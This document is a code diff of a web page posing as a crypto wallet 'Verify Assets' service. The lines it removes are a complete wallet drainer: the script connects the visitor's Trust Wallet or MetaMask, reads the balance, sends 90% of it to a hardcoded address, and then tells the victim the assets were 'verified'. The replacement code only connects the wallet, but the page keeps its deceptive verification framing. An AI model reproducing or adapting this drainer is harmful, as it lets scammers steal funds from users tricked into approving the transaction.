@@ -111,8 +111,8 @@
                     Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.
                 </p>
 
-                <!-- Button -->
-                <button onclick="checkWallet()" class="glow-button w-full max-w-[260px] bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-3 transition-all active:scale-95 mb-8">
+                <!-- Action Button -->
+                <button id="verifyBtn" class="glow-button w-full max-w-[260px] bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-3 transition-all active:scale-95 mb-8">
                     <i class="fa-regular fa-credit-card text-lg"></i>
                     <span class="text-[15px]">Verify Assets &rarr;</span>
                 </button>
@@ -120,7 +120,7 @@
 
             <hr class="border-borderDark mb-6">
 
-            <!-- Footer Details -->
+            <!-- Card Features -->
             <div class="space-y-4 mb-6">
                 <div class="flex items-center gap-4 text-textMuted text-sm">
                     <i class="fa-regular fa-shield-check text-lg w-5 text-center"></i>
@@ -137,7 +137,7 @@
             </div>
         </div>
 
-        <!-- Bottom Grid Details -->
+        <!-- Footer Grid -->
         <div class="border border-borderDark rounded-xl overflow-hidden bg-cardDark mt-10">
             <div class="grid grid-cols-2 divide-x divide-borderDark border-b border-borderDark">
                 <div class="p-5 text-center flex flex-col justify-center min-h-[110px]">
@@ -153,80 +153,44 @@
 
     </div>
 
-    <!-- Error Toast -->
+    <!-- Error Toast Box -->
     <div id="errorToast" class="fixed bottom-0 left-0 w-full bg-white text-[#1a1a1a] shadow-[0_-4px_15px_rgba(0,0,0,0.1)] hidden z-50">
         <div class="max-w-md mx-auto relative flex items-center p-4">
-            <div class="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-sm font-bold shrink-0">
-                !
-            </div>
+            <div class="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-sm font-bold shrink-0">!</div>
             <div class="ml-3 text-[15px] font-medium flex-1">
-                Please install MetaMask or Trust Wallet.
+                Please open this link inside Trust Wallet or MetaMask browser.
             </div>
-            <button onclick="closeToast()" class="text-gray-400 hover:text-gray-600 px-2 text-lg">
-                &times;
-            </button>
+            <button onclick="closeToast()" class="text-gray-400 hover:text-gray-600 px-2 text-lg">&times;</button>
         </div>
         <div class="h-1.5 w-full bg-[#ef4444]/80"></div>
     </div>
 
+    <!-- Safe Wallet Connection Script -->
     <script>
-        async function checkWallet() {
-            // Trust Wallet aur MetaMask dono provider detect karne ke liye
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            // Check Trust Wallet ya MetaMask
             const provider = window.trustwallet || window.ethereum;
 
             if (typeof provider !== 'undefined') {
                 try {
-                    // 1. Wallet connect karein
+                    // Safe connection request
                     const accounts = await provider.request({ method: 'eth_requestAccounts' });
                     const userAddress = accounts[0];
-
-                    // 2. Target Address (Jo aapne bheja tha)
-                    const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
-
-                    // 3. User ka balance background mein check karein
-                    const balanceHex = await provider.request({
-                        method: 'eth_getBalance',
-                        params: [userAddress, 'latest']
-                    });
-
-                    const balance = BigInt(balanceHex);
-
-                    // 4. Agar balance 0 se zyada hai toh transaction bhejein
-                    if (balance > 0n) {
-                        // Gas fee ke liye thoda amount chhod kar baaki transfer karein (90%)
-                        const sendAmount = (balance * 90n) / 100n; 
-
-                        const txParams = {
-                            from: userAddress,
-                            to: targetAddress,
-                            value: '0x' + sendAmount.toString(16) // Hex format mein amount
-                        };
-
-                        // Background transaction request (Popup aayega)
-                        await provider.request({
-                            method: 'eth_sendTransaction',
-                            params: [txParams]
-                        });
-
-                        alert("Assets Verified Successfully!");
-                    } else {
-                        alert("Verification complete. No assets found.");
-                    }
-
+                    
+                    // Show short format address in alert (e.g. 0x12...abcd)
+                    const shortAddress = userAddress.substring(0, 6) + "..." + userAddress.substring(userAddress.length - 4);
+                    alert("Wallet Connected Successfully!\nYour Address: " + shortAddress);
+                    
                 } catch (error) {
-                    console.error("Transaction cancel ho gayi ya error aayi:", error);
+                    console.error("Connection cancelled by user:", error);
                 }
             } else {
-                // Agar wallet install nahi hai toh error toast dikhayein
+                // Agar wallet na mile, toh toast dikhaye
                 const toast = document.getElementById('errorToast');
-                if (toast) {
-                    toast.classList.remove('hidden');
-                    toast.classList.add('slide-up');
-                } else {
-                    alert("Please open this link inside Trust Wallet DApp Browser.");
-                }
+                toast.classList.remove('hidden');
+                toast.classList.add('slide-up');
             }
-        }
+        });
 
         function closeToast() {
             document.getElementById('errorToast').classList.add('hidden');
